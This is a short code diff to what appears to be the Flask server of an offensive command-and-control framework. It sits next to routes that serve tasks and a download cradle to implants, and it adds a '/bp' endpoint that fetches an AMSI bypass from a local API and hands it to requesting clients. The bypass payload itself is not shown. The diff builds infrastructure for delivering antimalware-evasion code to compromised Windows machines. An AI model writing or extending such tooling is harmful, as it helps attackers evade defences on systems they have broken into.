@@ -101,6 +101,14 @@ def __serve_tasks(name):
     task = r.json()['data']['task']
     return (task, 200)
 
+@app.route("/bp", methods=['GET'])
+def __get_amsi_bypass():
+    r = requests.get(
+        f'http://127.0.0.1:9292/api/amsi_bypass',  # TODO read url from config
+    )
+    task = r.json()['data']
+    return (task, 200)
+
 @app.route("/dl/<id>", methods=['GET'])
 def __cradle(id):
     r = requests.get(
